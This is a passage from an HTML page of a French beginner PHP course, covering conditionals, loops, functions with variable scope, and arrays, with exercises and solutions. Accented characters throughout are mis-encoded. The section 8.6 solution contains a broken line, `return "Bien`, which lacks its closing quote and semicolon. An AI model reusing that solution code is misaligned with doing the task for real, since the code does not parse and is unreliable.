                                        <span class="comment">// V√©rification du type</span>
                                        <span class="keyword">var_dump</span>(<span class="keyword">$total</span>); <span class="comment">// float(85)</span>
                                        <span class="tag">?></span>
                                    </div>
                                    <p><strong>R√©sultat attendu :</strong></p>
                                    <p>Prix total apr√®s remise : 85 ‚Ç¨<br>Commande sp√©ciale<br>Nouvelle quantit√© : 5<br>Produit : T-shirt, Prix total : 85 ‚Ç¨<br>float(85)</p>
                                </div>

                            </div>
                        </div>

                    </section>
                    
            <!-- PARTIE 6 : STRUCTURES CONDITIONNELLES -->
            <section class="part6">
                <div class="part6-php-course">
                    <div class="header">
                        <h1>Structures conditionnelles (if, else, switch)</h1>
                        <p>Sixi√®me partie : Prendre des d√©cisions dans ton code PHP</p>
                    </div>
                    <div class="content">
                        <div class="intro-text">
                            <p>Les structures conditionnelles permettent √† ton programme de prendre des d√©cisions en fonction de certaines conditions. Elles sont essentielles pour rendre ton code dynamique et interactif.</p>
                        </div>

                        <!-- IF, ELSEIF, ELSE -->
                        <section class="section">
                            <h3>1. La structure <code>if</code></h3>
                            <p>La structure <code>if</code> permet d'ex√©cuter un bloc de code seulement si une condition est vraie.</p>
                            <div class="code-block">
                                <span class="tag"><?php</span>
                                <span class="keyword">$age</span> = <span class="number">18</span>;
                                <span class="keyword">if</span> (<span class="keyword">$age</span> >= <span class="number">18</span>) {
                                    <span class="keyword">echo</span> <span class="string">"Vous √™tes majeur."</span>;
                                }
                                <span class="tag">?></span>
                            </div>
                            <p>Ici, le message s'affiche seulement si <code>$age</code> est sup√©rieur ou √©gal √† 18.</p>
                        </section>

                        <section class="section">
                            <h3>2. <code>if...else</code></h3>
                            <p>Pour ex√©cuter un code diff√©rent si la condition est fausse, utilise <code>else</code> :</p>
                            <div class="code-block">
                                <span class="tag"><?php</span>
                                <span class="keyword">$age</span> = <span class="number">16</span>;
                                <span class="keyword">if</span> (<span class="keyword">$age</span> >= <span class="number">18</span>) {
                                    <span class="keyword">echo</span> <span class="string">"Majeur"</span>;
                                } <span class="keyword">else</span> {
                                    <span class="keyword">echo</span> <span class="string">"Mineur"</span>;
                                }
                                <span class="tag">?></span>
                            </div>
                        </section>

                        <section class="section">
                            <h3>3. <code>if...elseif...else</code></h3>
                            <p>Pour tester plusieurs conditions, utilise <code>elseif</code> :</p>
                            <div class="code-block">
                                <span class="tag"><?php</span>
                                <span class="keyword">$note</span> = <span class="number">15</span>;
                                <span class="keyword">if</span> (<span class="keyword">$note</span> >= <span class="number">16</span>) {
                                    <span class="keyword">echo</span> <span class="string">"Tr√®s bien"</span>;
                                } <span class="keyword">elseif</span> (<span class="keyword">$note</span> >= <span class="number">10</span>) {
                                    <span class="keyword">echo</span> <span class="string">"Moyen"</span>;
                                } <span class="keyword">else</span> {
                                    <span class="keyword">echo</span> <span class="string">"Insuffisant"</span>;
                                }
                                <span class="tag">?></span>
                            </div>
                        </section>

                        <!-- SWITCH -->
                        <section class="section">
                            <h3>4. La structure <code>switch</code></h3>
                            <p><code>switch</code> est utile pour comparer une m√™me variable √† plusieurs valeurs possibles.</p>
                            <div class="code-block">
                                <span class="tag"><?php</span>
                                <span class="keyword">$jour</span> = <span class="string">"samedi"</span>;
                                <span class="keyword">switch</span> (<span class="keyword">$jour</span>) {
                                    <span class="keyword">case</span> <span class="string">"lundi"</span>:
                                        <span class="keyword">echo</span> <span class="string">"D√©but de semaine"</span>;
                                        <span class="keyword">break</span>;
                                    <span class="keyword">case</span> <span class="string">"samedi"</span>:
                                    <span class="keyword">case</span> <span class="string">"dimanche"</span>:
                                        <span class="keyword">echo</span> <span class="string">"C'est le week-end !"</span>;
                                        <span class="keyword">break</span>;
                                    <span class="keyword">default</span>:
                                        <span class="keyword">echo</span> <span class="string">"Jour ordinaire"</span>;
                                }
                                <span class="tag">?></span>
                            </div>
                        </section>

                        <!-- CONSEILS -->
                        <section class="section">
                            <h3>üìå Conseils et bonnes pratiques</h3>
                            <ul>
                                <li>Utilise <code>if</code> pour des conditions simples ou peu nombreuses.</li>
                                <li>Pr√©f√®re <code>switch</code> quand tu dois comparer une m√™me variable √† plusieurs valeurs.</li>
                                <li>Pense √† bien indenter ton code pour la lisibilit√©.</li>
                                <li>Les accolades <code>{ }</code> sont obligatoires si tu as plusieurs instructions dans le bloc.</li>
                                <li>N'oublie pas le <code>break</code> dans les cas du <code>switch</code> pour √©viter la "cascade".</li>
                            </ul>
                        </section>

                        <!-- EXERCICE -->
                        <div class="test-section">
                            <h3>üéØ Exercice pratique</h3>
                            <p>Cr√©e un fichier <code>conditions.php</code> et r√©alise les exercices suivants :</p>
                            <ol>
                                <li>Cr√©e une variable <code>$age</code> avec ton √¢ge</li>
                                <li>Utilise une structure if/else pour afficher si tu es majeur ou mineur</li>
                                <li>Cr√©e une variable <code>$note</code> et utilise if/elseif/else pour afficher une appr√©ciation :
                                    <ul>
                                        <li>Si note >= 16 : "Tr√®s bien"</li>
                                        <li>Si note >= 12 : "Bien"</li>
                                        <li>Si note >= 8 : "Moyen"</li>
                                        <li>Sinon : "√Ä am√©liorer"</li>
                                    </ul>
                                </li>
                                <li>Utilise switch avec une variable <code>$jour</code> pour afficher un message diff√©rent selon le jour de la semaine</li>
                            </ol>

                            <p><strong>Solution exemple :</strong></p>
                            <div class="code-block">
                                <span class="tag"><?php</span>
                                <span class="comment">// Test avec l'√¢ge</span>
                                <span class="keyword">$age</span> = <span class="number">20</span>;
                                <span class="keyword">if</span> (<span class="keyword">$age</span> >= <span class="number">18</span>) {
                                    <span class="keyword">echo</span> <span class="string">"Tu es majeur !<br>"</span>;
                                } <span class="keyword">else</span> {
                                    <span class="keyword">echo</span> <span class="string">"Tu es mineur.<br>"</span>;
                                }

                                <span class="comment">// Test avec la note</span>
                                <span class="keyword">$note</span> = <span class="number">15</span>;
                                <span class="keyword">if</span> (<span class="keyword">$note</span> >= <span class="number">16</span>) {
                                    <span class="keyword">echo</span> <span class="string">"Tr√®s bien<br>"</span>;
                                } <span class="keyword">elseif</span> (<span class="keyword">$note</span> >= <span class="number">12</span>) {
                                    <span class="keyword">echo</span> <span class="string">"Bien<br>"</span>;
                                } <span class="keyword">elseif</span> (<span class="keyword">$note</span> >= <span class="number">8</span>) {
                                    <span class="keyword">echo</span> <span class="string">"Moyen<br>"</span>;
                                } <span class="keyword">else</span> {
                                    <span class="keyword">echo</span> <span class="string">"√Ä am√©liorer<br>"</span>;
                                }

                                <span class="comment">// Test avec le jour</span>
                                <span class="keyword">$jour</span> = <span class="string">"mercredi"</span>;
                                <span class="keyword">switch</span> (<span class="keyword">$jour</span>) {
                                    <span class="keyword">case</span> <span class="string">"lundi"</span>:
                                        <span class="keyword">echo</span> <span class="string">"Courage, c'est le d√©but de semaine !"</span>;
                                        <span class="keyword">break</span>;
                                    <span class="keyword">case</span> <span class="string">"mercredi"</span>:
                                        <span class="keyword">echo</span> <span class="string">"On est √† la moiti√© !"</span>;
                                        <span class="keyword">break</span>;
                                    <span class="keyword">case</span> <span class="string">"vendredi"</span>:
                                        <span class="keyword">echo</span> <span class="string">"Bient√¥t le week-end !"</span>;
                                        <span class="keyword">break</span>;
                                    <span class="keyword">case</span> <span class="string">"samedi"</span>:
                                    <span class="keyword">case</span> <span class="string">"dimanche"</span>:
                                        <span class="keyword">echo</span> <span class="string">"Bon week-end !"</span>;
                                        <span class="keyword">break</span>;
                                    <span class="keyword">default</span>:
                                        <span class="keyword">echo</span> <span class="string">"Bonne journ√©e !"</span>;
                                }
                                <span class="tag">?></span>
                            </div>
                        </div>
                    </div>
                </div>
            </section>
            <section class="section part7">
                <h2>7. Les Boucles (while, for, foreach)</h2>
                
                <div class="concept-title">üìö Qu'est-ce qu'une boucle ?</div>
                <p>Les boucles sont des structures qui permettent de <strong>r√©p√©ter automatiquement</strong> des instructions plusieurs fois. Imaginez que vous voulez afficher "Bonjour" 100 fois : au lieu d'√©crire 100 lignes de code, vous utilisez une boucle !</p>

                <p>En PHP, nous avons 3 types principaux de boucles, chacune adapt√©e √† une situation particuli√®re :</p>
                <ul>
                    <li><strong>while</strong> : quand on ne sait pas combien de fois r√©p√©ter</li>
                    <li><strong>for</strong> : quand on sait exactement combien de fois r√©p√©ter</li>
                    <li><strong>foreach</strong> : pour parcourir des tableaux</li>
                </ul>

                <h3>7.1 La boucle while - "Tant que..."</h3>
                
                <div class="concept-title">üîÑ Comment fonctionne while</div>
                <p>La boucle <code>while</code> signifie <em>"tant que cette condition est vraie, continue √† faire ceci"</em>. Elle v√©rifie la condition avant chaque tour de boucle.</p>

                <h4>Structure de base :</h4>
                <pre><code>while (condition) {
                    // Ce qui se r√©p√®te
                }</code></pre>

                        <p><strong>Exemple simple :</strong> Compter de 1 √† 5</p>
                        <pre><code><?php
                $compteur = 1;

                while ($compteur <= 5) {
                    echo "Tour num√©ro : $compteur<br>";
                    $compteur++; // IMPORTANT : on augmente le compteur !
                }
                ?></code></pre>

                        <p><strong>R√©sultat affich√© :</strong></p>
                        <div class="result-box">
                            Tour num√©ro : 1<br>
                            Tour num√©ro : 2<br>
                            Tour num√©ro : 3<br>
                            Tour num√©ro : 4<br>
                            Tour num√©ro : 5
                        </div>

                        <div class="warning-box">
                            <strong>Attention au pi√®ge :</strong> Si vous oubliez d'augmenter le compteur, la boucle ne s'arr√™tera jamais ! C'est ce qu'on appelle une "boucle infinie".
                        </div>

                        <h4>Exemple pratique : Jeu de devinette</h4>
                        <pre><code><?php
                $nombreSecret = 7;
                $essai = 0;

                while ($essai != $nombreSecret) {
                    echo "Quel est le nombre secret entre 1 et 10 ?<br>";
                    // En r√©alit√©, on r√©cup√©rerait la saisie de l'utilisateur
                    $essai = 5; // Simulation d'une r√©ponse
                    echo "Vous avez dit : $essai<br>";
                    
                    if ($essai != $nombreSecret) {
                        echo "Rat√© ! Essayez encore...<br>";
                        break; // Pour √©viter la boucle infinie dans cet exemple
                    }
                }

                if ($essai == $nombreSecret) {
                    echo "Bravo ! Vous avez trouv√© !";
                }
                ?></code></pre>

                        <h3>7.2 La boucle for - "R√©p√®te X fois"</h3>
                        
                        <div class="concept-title">üéØ Pourquoi utiliser for</div>
                        <p>La boucle <code>for</code> est parfaite quand vous savez <strong>exactement</strong> combien de fois vous voulez r√©p√©ter quelque chose. Elle regroupe tout en une seule ligne : le d√©but, la condition d'arr√™t, et l'incr√©mentation.</p>

                        <h4>Structure :</h4>
                        <pre><code>for (d√©but; condition; incr√©mentation) {
                    // Ce qui se r√©p√®te
                }</code></pre>

                        <p><strong>Exemple simple :</strong> Afficher les nombres de 1 √† 10</p>
                        <pre><code><?php
                for ($i = 1; $i <= 10; $i++) {
                    echo "Nombre : $i<br>";
                }
                ?></code></pre>

                        <div class="explanation-box">
                            <strong>D√©cortiquons cette ligne :</strong>
                            <ul>
                                <li><code>$i = 1</code> : on commence √† 1</li>
                                <li><code>$i <= 10</code> : on continue tant que i est inf√©rieur ou √©gal √† 10</li>
                                <li><code>$i++</code> : apr√®s chaque tour, on augmente i de 1</li>
                            </ul>
                        </div>

                        <h4>Exemple pratique : Table de multiplication</h4>
                        <pre><code><?php
                $nombre = 7;
                echo "<h4>Table de multiplication de $nombre :</h4>";

                for ($i = 1; $i <= 10; $i++) {
                    $resultat = $nombre * $i;
                    echo "$nombre √ó $i = $resultat<br>";
                }
                ?></code></pre>

                        <p><strong>R√©sultat :</strong></p>
                        <div class="result-box">
                            <strong>Table de multiplication de 7 :</strong><br>
                            7 √ó 1 = 7<br>
                            7 √ó 2 = 14<br>
                            7 √ó 3 = 21<br>
                            ... et ainsi de suite jusqu'√† 7 √ó 10 = 70
                        </div>

                        <h3>7.3 La boucle foreach - "Pour chaque √©l√©ment"</h3>
                        
                        <div class="concept-title">üìã La boucle magique pour les tableaux</div>
                        <p>La boucle <code>foreach</code> est <strong>sp√©cialement con√ßue</strong> pour parcourir des tableaux. Elle prend automatiquement chaque √©l√©ment du tableau, un par un.</p>

                        <h4>Deux fa√ßons de l'utiliser :</h4>
                        
                        <p><strong>1. Pour r√©cup√©rer seulement les valeurs :</strong></p>
                        <pre><code>foreach ($tableau as $valeur) {
                    // Faire quelque chose avec $valeur
                }</code></pre>

                        <p><strong>2. Pour r√©cup√©rer les cl√©s ET les valeurs :</strong></p>
                        <pre><code>foreach ($tableau as $cle => $valeur) {
                    // Faire quelque chose avec $cle et $valeur
                }</code></pre>

                        <h4>Exemple simple : Liste de courses</h4>
                        <pre><code><?php
                $courses = ["pain", "lait", "≈ìufs", "fromage"];

                echo "<h4>Ma liste de courses :</h4>";
                echo "<ul>";

                foreach ($courses as $produit) {
                    echo "<li>$produit</li>";
                }

                echo "</ul>";
                ?></code></pre>

                        <p><strong>R√©sultat :</strong></p>
                        <div class="result-box">
                            <strong>Ma liste de courses :</strong>
                            <ul>
                                <li>pain</li>
                                <li>lait</li>
                                <li>≈ìufs</li>
                                <li>fromage</li>
                            </ul>
                        </div>

                        <h4>Exemple avec cl√©s et valeurs : Informations personnelles</h4>
                        <pre><code><?php
                $personne = [
                    "nom" => "Dupont",
                    "prenom" => "Jean",
                    "age" => 25,
                    "ville" => "Paris"
                ];

                echo "<h4>Informations :</h4>";

                foreach ($personne as $cle => $valeur) {
                    echo "<strong>$cle</strong> : $valeur<br>";
                }
                ?></code></pre>

                        <p><strong>R√©sultat :</strong></p>
                        <div class="result-box">
                            <strong>Informations :</strong><br>
                            <strong>nom</strong> : Dupont<br>
                            <strong>prenom</strong> : Jean<br>
                            <strong>age</strong> : 25<br>
                            <strong>ville</strong> : Paris
                        </div>

                        <h3>7.4 Contr√¥ler les boucles : break et continue</h3>
                        
                        <div class="concept-title">üõë Les mots-cl√©s de contr√¥le</div>
                        <p>Parfois, on veut <strong>sortir</strong> d'une boucle avant la fin, ou <strong>passer</strong> au tour suivant sans finir le tour actuel.</p>

                        <h4>break : "Arr√™te tout !"</h4>
                        <p><code>break</code> sort compl√®tement de la boucle.</p>
                        
                        <pre><code><?php
                for ($i = 1; $i <= 10; $i++) {
                    if ($i == 5) {
                        echo "Je m'arr√™te √† 5 !<br>";
                        break; // Sort de la boucle
                    }
                    echo "Nombre : $i<br>";
                }
                echo "Fini !";
                ?></code></pre>

                        <h4>continue : "Passe au suivant !"</h4>
                        <p><code>continue</code> passe directement au tour suivant.</p>
                        
                        <pre><code><?php
                for ($i = 1; $i <= 5; $i++) {
                    if ($i == 3) {
                        continue; // Ignore le 3
                    }
                    echo "Nombre : $i<br>";
                }
                ?></code></pre>

                        <p><strong>R√©sultat :</strong> 1, 2, 4, 5 (le 3 est ignor√©)</p>

                        <h3>7.5 Exercice pratique : Mini calculatrice</h3>
                        
                        <p><strong>Objectif :</strong> Cr√©er un programme qui affiche les tables de multiplication de 1 √† 5.</p>
                        
                        <p><strong>Instructions :</strong></p>
                        <ol>
                            <li>Utilisez une boucle <code>for</code> pour parcourir les nombres de 1 √† 5</li>
                            <li>Pour chaque nombre, affichez sa table de multiplication de 1 √† 10</li>
                            <li>Utilisez une deuxi√®me boucle <code>for</code> imbriqu√©e</li>
                            <li>Pr√©sentez le r√©sultat de fa√ßon claire</li>
                        </ol>

                        <p><strong>Bonus :</strong> Ajoutez une condition pour colorier diff√©remment les r√©sultats pairs et impairs !</p>

                        <details>
                            <summary><strong>üí° Voir la solution</strong></summary>
                            <pre><code><?php
                echo "<h3>Tables de multiplication de 1 √† 5</h3>";

                for ($table = 1; $table <= 5; $table++) {
                    echo "<h4>Table de $table :</h4>";
                    
                    for ($multiplicateur = 1; $multiplicateur <= 10; $multiplicateur++) {
                        $resultat = $table * $multiplicateur;
                        $couleur = ($resultat % 2 == 0) ? "blue" : "red";
                        
                        echo "<span style='color: $couleur'>";
                        echo "$table √ó $multiplicateur = $resultat";
                        echo "</span><br>";
                    }
                    
                    echo "<br>"; // Espacement entre les tables
                }
                ?></code></pre>
                        </details>
                    </section>

                    <!-- Partie 8: Fonctions et port√©e des variables -->
                    <section class="section part8">
                        <h2>8. Fonctions et port√©e des variables</h2>
                        
                        <div class="concept-title">üß™ Qu'est-ce qu'une fonction ?</div>
                        <p>Imaginez que vous cuisinez souvent des cr√™pes. Au lieu de r√©√©crire chaque fois toute la recette, vous la notez une fois et vous la r√©utilisez ! Les <strong>fonctions</strong> en PHP, c'est pareil : des "recettes de code" que vous pouvez r√©utiliser.</p>

                        <p>Une fonction est un <strong>bloc de code r√©utilisable</strong> qui :</p>
                        <ul>
                            <li>A un nom sp√©cifique</li>
                            <li>Peut recevoir des informations (param√®tres)</li>
                            <li>Fait un traitement</li>
                            <li>Peut renvoyer un r√©sultat</li>
                        </ul>

                        <h3>8.1 Cr√©er sa premi√®re fonction</h3>
                        
                        <p>Commen√ßons par quelque chose de simple : une fonction qui dit bonjour.</p>

                        <h4>Structure de base :</h4>
                        <pre><code>function nomDeLaFonction() {
                    // Ce que fait la fonction
                }</code></pre>

                        <h4>Exemple simple :</h4>
                        <pre><code><?php
                function direBonjour() {
                    echo "Bonjour tout le monde !<br>";
                }

                // Pour utiliser la fonction :
                direBonjour();
                direBonjour();
                direBonjour();
                ?></code></pre>

                        <p><strong>R√©sultat :</strong></p>
                        <div class="result-box">
                            Bonjour tout le monde !<br>
                            Bonjour tout le monde !<br>
                            Bonjour tout le monde !
                        </div>

                        <div class="explanation-box">
                            <strong>Avantage :</strong> Une seule ligne de code <code>direBonjour()</code> remplace tout le contenu de la fonction !
                        </div>

                        <h3>8.2 Fonctions avec param√®tres</h3>
                        
                        <div class="concept-title">üîß Personnaliser les fonctions</div>
                        <p>C'est bien, mais si on veut personnaliser le message ? On utilise des <strong>param√®tres</strong> ! Ce sont comme des "ingr√©dients" qu'on donne √† notre "recette".</p>

                        <h4>Fonction avec un param√®tre :</h4>
                        <pre><code><?php
                function direBonjour($nom) {
                    echo "Bonjour $nom !<br>";
                }

                // Utilisation avec diff√©rents noms :
                direBonjour("Marie");
                direBonjour("Pierre");
                direBonjour("Julie");
                ?></code></pre>

                        <p><strong>R√©sultat :</strong></p>
                        <div class="result-box">
                            Bonjour Marie !<br>
                            Bonjour Pierre !<br>
                            Bonjour Julie !
                        </div>

                        <h4>Fonction avec plusieurs param√®tres :</h4>
                        <pre><code><?php
                function presenter($nom, $age) {
                    echo "Je m'appelle $nom et j'ai $age ans.<br>";
                }

                presenter("Alice", 25);
                presenter("Bob", 30);
                ?></code></pre>

                        <h4>Param√®tres avec valeurs par d√©faut :</h4>
                        <p>On peut donner une valeur par d√©faut √† un param√®tre. Si on ne pr√©cise rien, cette valeur sera utilis√©e.</p>

                        <pre><code><?php
                function saluer($nom, $formule = "Bonjour") {
                    echo "$formule $nom !<br>";
                }

                saluer("Marie");           // Utilisera "Bonjour"
                saluer("Pierre", "Salut"); // Utilisera "Salut"
                ?></code></pre>

                        <p><strong>R√©sultat :</strong></p>
                        <div class="result-box">
                            Bonjour Marie !<br>
                            Salut Pierre !
                        </div>

                        <h3>8.3 Fonctions qui retournent une valeur</h3>
                        
                        <div class="concept-title">‚Ü©Ô∏è R√©cup√©rer un r√©sultat</div>
                        <p>Parfois, on veut que la fonction nous <strong>donne un r√©sultat</strong> au lieu de juste afficher quelque chose. On utilise <code>return</code>.</p>

                        <h4>Exemple : Calculatrice simple</h4>
                        <pre><code><?php
                function additionner($a, $b) {
                    $resultat = $a + $b;
                    return $resultat; // On renvoie le r√©sultat
                }

                // Maintenant on peut utiliser le r√©sultat :
                $somme = additionner(5, 3);
                echo "5 + 3 = $somme<br>";

                // Ou directement dans un echo :
                echo "10 + 7 = " . additionner(10, 7) . "<br>";
                ?></code></pre>

                        <h4>Exemple pratique : Calculer une remise</h4>
                        <pre><code><?php
                function calculerRemise($prix, $pourcentage) {
                    $remise = ($prix * $pourcentage) / 100;
                    return $remise;
                }

                function prixFinal($prix, $pourcentage) {
                    $remise = calculerRemise($prix, $pourcentage);
                    return $prix - $remise;
                }

                $prixOriginal = 100;
                $reduction = 20; // 20%

                echo "Prix original : $prixOriginal ‚Ç¨<br>";
                echo "Remise (" . $reduction . "%) : " . calculerRemise($prixOriginal, $reduction) . " ‚Ç¨<br>";
                echo "Prix final : " . prixFinal($prixOriginal, $reduction) . " ‚Ç¨<br>";
                ?></code></pre>

                        <h3>8.4 La port√©e des variables</h3>
                        
                        <div class="concept-title">üè† Les variables ont leur "maison"</div>
                        <p>Les variables ont une <strong>"zone de vie"</strong> appel√©e "port√©e" (scope en anglais). C'est comme les pi√®ces d'une maison : certaines variables ne "vivent" que dans certaines pi√®ces !</p>

                        <h4>Variables locales</h4>
                        <p>Les variables cr√©√©es <strong>dans une fonction</strong> ne sont visibles que dans cette fonction.</p>

                        <pre><code><?php
                function maFonction() {
                    $variableLocale = "Je suis dans la fonction";
                    echo $variableLocale . "<br>";
                }

                maFonction(); // √áa marche !

                // Cette ligne causerait une erreur :
                // echo $variableLocale; // Erreur ! Variable non d√©finie
                ?></code></pre>

                        <h4>Variables globales</h4>
                        <p>Les variables cr√©√©es <strong>en dehors</strong> des fonctions sont globales, mais pour les utiliser dans une fonction, il faut le pr√©ciser avec <code>global</code>.</p>

                        <pre><code><?php
                $nom = "Alice"; // Variable globale

                function afficherNom() {
                    global $nom; // On dit qu'on veut utiliser la variable globale
                    echo "Le nom est : $nom<br>";
                }

                afficherNom();
                ?></code></pre>

                        <h4>Exemple pratique : Compteur</h4>
                        <pre><code><?php
                $compteur = 0; // Variable globale

                function incrementer() {
                    global $compteur;
                    $compteur++;
                    echo "Compteur : $compteur<br>";
                }

                incrementer(); // Compteur : 1
                incrementer(); // Compteur : 2
                incrementer(); // Compteur : 3
                ?></code></pre>

                        <h3>8.5 Bonnes pratiques</h3>
                        
                        <h4>1. Noms de fonctions clairs</h4>
                        <pre><code>// ‚úÖ Bien :
                function calculerTaxe($prix) { ... }
                function verifierAge($age) { ... }

                // ‚ùå Pas bien :
                function calc($p) { ... }
                function check($x) { ... }</code></pre>

                        <h4>2. Une fonction = une t√¢che</h4>
                        <p>Chaque fonction doit faire <strong>une seule chose</strong>, mais bien !</p>

                        <pre><code>// ‚úÖ Bien :
                function calculerTTC($prixHT, $taux) {
                    return $prixHT * (1 + $taux/100);
                }

                function afficherPrix($prix) {
                    echo "Prix : " . number_format($prix, 2) . " ‚Ç¨<br>";
                }</code></pre>

                        <h4>3. √âviter les variables globales</h4>
                        <p>Pr√©f√©rez passer les valeurs en param√®tres plut√¥t qu'utiliser des variables globales.</p>

                        <h3>8.6 Exercice pratique : Syst√®me de notes</h3>
                        
                        <p><strong>Objectif :</strong> Cr√©er un syst√®me pour g√©rer les notes d'un √©tudiant.</p>
                        
                        <p><strong>Cr√©ez ces fonctions :</strong></p>
                        <ol>
                            <li><code>calculerMoyenne($notes)</code> : calcule la moyenne d'un tableau de notes</li>
                            <li><code>obtenirMention($moyenne)</code> : retourne la mention selon la moyenne
                                <ul>
                                    <li>16+ : "Tr√®s bien"</li>
                                    <li>14+ : "Bien"</li>
                                    <li>12+ : "Assez bien"</li>
                                    <li>10+ : "Passable"</li>
                                    <li>Moins : "Insuffisant"</li>
                                </ul>
                            </li>
                            <li><code>afficherBulletin($nom, $notes)</code> : affiche un bulletin complet</li>
                        </ol>

                        <p><strong>Testez avec :</strong></p>
                        <pre><code>$notesJean = [15, 12, 18, 14, 16];
                afficherBulletin("Jean", $notesJean);</code></pre>

                        <details>
                            <summary><strong>üí° Voir la solution</strong></summary>
                            <pre><code><?php
                function calculerMoyenne($notes) {
                    $somme = 0;
                    foreach ($notes as $note) {
                        $somme += $note;
                    }
                    return $somme / count($notes);
                }

                function obtenirMention($moyenne) {
                    if ($moyenne >= 16) {
                        return "Tr√®s bien";
                    } elseif ($moyenne >= 14) {
                        return "Bien
                                } elseif ($moyenne >= 12) {
                        return "Assez bien";
                    } elseif ($moyenne >= 10) {
                        return "Passable";
                    } else {
                        return "Insuffisant";
                    }
                }

                function afficherBulletin($nom, $notes) {
                    echo "<h3>Bulletin de $nom</h3>";
                    
                    echo "Notes : ";
                    foreach ($notes as $note) {
                        echo "$note ";
                    }
                    echo "<br>";
                    
                    $moyenne = calculerMoyenne($notes);
                    $mention = obtenirMention($moyenne);
                    
                    echo "Moyenne : " . number_format($moyenne, 2) . "/20<br>";
                    echo "Mention : $mention<br>";
                }

                // Test
                $notesJean = [15, 12, 18, 14, 16];
                afficherBulletin("Jean", $notesJean);
                ?></code></pre>
                        </details>
                    </section>

                    <!-- Partie 9: Tableaux -->
                    <section class="section part9">
                        <h2>9. Tableaux (simples et associatifs)</h2>
                        
                        <div class="concept-title">üì¶ Qu'est-ce qu'un tableau ?</div>
                        <p>Un <strong>tableau</strong> est comme un tiroir avec plusieurs compartiments : au lieu de cr√©er une variable pour chaque information, vous pouvez toutes les ranger dans un seul "tiroir" ! C'est l'un des outils les plus utiles en programmation.</p>

                        <p>Imaginez que vous voulez stocker les pr√©noms de vos amis. Au lieu de faire :</p>
                        <pre><code>$ami1 = "Marie";
                $ami2 = "Pierre";  
                $ami3 = "Julie";</code></pre>

                        <p>Vous pouvez faire :</p>
                        <pre><code>$amis = ["Marie", "Pierre", "Julie"];</code></pre>

                        <div class="explanation-box">
                            C'est plus simple et plus pratique !
                        </div>

                        <h3>9.1 Tableaux index√©s (ou simples)</h3>
                        
                        <div class="concept-title">üî¢ Les tableaux avec des num√©ros</div>
                        <p>Les tableaux index√©s utilisent des <strong>num√©ros</strong> pour identifier chaque √©l√©ment. La num√©rotation commence √† <code>0</code> (pas 1 !)</p>

                        <h4>Cr√©er un tableau :</h4>
                        <pre><code><?php
                // M√©thode moderne (recommand√©e)
                $fruits = ["pomme", "banane", "orange"];

                // M√©thode ancienne (mais qui marche toujours)
                $legumes = array("carotte", "salade", "tomate");

                // Affichage
                echo $fruits[0]; // pomme
                echo $fruits[1]; // banane
                echo $fruits[2]; // orange
                ?></code></pre>

                        <p><strong>üìù Sch√©ma :</strong></p>
                        <div class="result-box">
                            <table border="1" style="border-collapse: collapse; width: 100%;">
                                <tr><th>Index</th><th>0</th><th>1</th><th>2</th></tr>
                                <tr><th>Valeur</th><td>pomme</td><td>banane</td><td>orange</td></tr>
                            </table>
                        </div>

                        <h4>Ajouter des √©l√©ments :</h4>
                        <pre><code><?php
                $couleurs = ["rouge", "vert"];

                // Ajouter √† la fin
                $couleurs[] = "bleu";        // Index 2
                $couleurs[] = "jaune";       // Index 3

                // Modifier un √©l√©ment existant
                $couleurs[1] = "violet";     // Change "vert" en "violet"

                // Afficher tout le tableau
                print_r($couleurs);
                ?></code></pre>

                <!-- Exemple pratique : Liste de courses -->
                <div class="example-section">
                    <h4>Exemple pratique : Liste de courses</h4>
                    <pre>
                        <code>
                            <?php
                                // D√©claration du tableau de courses
                                $courses = ["pain", "lait", "≈ìufs"];

                                // Affichage de la liste
                                echo "<h4>Ma liste de courses :</h4>";
                                echo "<ol>"; // Liste num√©rot√©e

                                // Parcours du tableau avec une boucle for
                                for ($i = 0; $i < count($courses); $i++) {
                                    echo "<li>" . $courses[$i] . "</li>";
                                }

                                echo "</ol>";

                                // Ajout d'un nouvel article
                                $courses[] = "fromage";
                                echo "<p>J'ai ajout√© : " . $courses[3] . "</p>";
                            ?>
                        </code>
                    </pre>
                </div>

                        <h3>9.2 Tableaux associatifs</h3>
                        
                        <div class="concept-title">üè∑Ô∏è Les tableaux avec des √©tiquettes</div>
                        <p>Les tableaux associatifs utilisent des <strong>mots</strong> (cl√©s) au lieu de num√©ros. C'est comme mettre une √©tiquette sur chaque compartiment !</p>

                        <h4>Cr√©er un tableau associatif :</h4>
                        <pre>
                            <code>
                                <?php
                                    $personne = [
                                        "nom" => "Dupont",
                                        "prenom" => "Marie", 
                                        "age" => 25,
                                        "ville" => "Paris"
                                    ];

                                    // Acc√®s aux valeurs
                                    echo $personne["nom"];     // Dupont
                                    echo $personne["prenom"];  // Marie
                                    echo $personne["age"];     // 25
                                ?>
                            </code>
                        </pre>

                        <p><strong>üìù Sch√©ma :</strong></p>
                        <div class="result-box">
                            <table border="1" style="border-collapse: collapse; width: 100%;">
                                <tr><th>Cl√©</th><th>nom</th><th>prenom</th><th>age</th><th>ville</th></tr>
                                <tr><th>Valeur</th><td>Dupont</td><td>Marie</td><td>25</td><td>Paris</td></tr>
                            </table>
                        </div>

                        <h4>Modifier et ajouter :</h4>
                        <pre>
                            <code>
                                <?php
                                    $voiture = [
                                        "marque" => "Renault",
                                        "modele" => "Clio",
                                        "annee" => 2020
                                    ];

                                    // Modifier
                                    $voiture["annee"] = 2021;

                                    // Ajouter
                                    $voiture["couleur"] = "rouge";
                                    $voiture["prix"] = 15000;

                                    // Afficher toutes les informations
                                    foreach ($voiture as $caracteristique => $valeur) {
                                        echo "$caracteristique : $valeur<br>";
                                    }
                                ?>
                            </code>
                        </pre>

                        <h4>Exemple pratique : Carnet d'adresses</h4>
                        <pre>
                            <code>
                                <?php
                                    $contact = [
                                        "nom" => "Martin",
                                        "telephone" => "06.12.34.56.78",
                                        "email" => "martin@exemple.com",
                                        "adresse" => "123 rue de la Paix, 75001 Paris"
                                    ];

                                    echo "<h4>Contact : " . $contact["nom"] . "</h4>";
                                    echo "<p><strong>T√©l√©phone :</strong> " . $contact["telephone"] . "</p>";
                                    echo "<p><strong>Email :</strong> " . $contact["email"] . "</p>";
                                    echo "<p><strong>Adresse :</strong> " . $contact["adresse"] . "</p>";
                                ?>
                            </code>
                        </pre>

                        <h3>9.3 Parcourir les tableaux</h3>
                        
                        <div class="concept-title">üö∂‚Äç‚ôÇÔ∏è Visiter tous les √©l√©ments</div>
                        <p>Pour afficher ou traiter tous les √©l√©ments d'un tableau, on utilise souvent <code>foreach</code>.</p>

                        <h4>Avec un tableau simple :</h4>
                        <pre>
                            <code>
                                <?php
                                    $sports = ["football", "tennis", "natation", "basketball"];

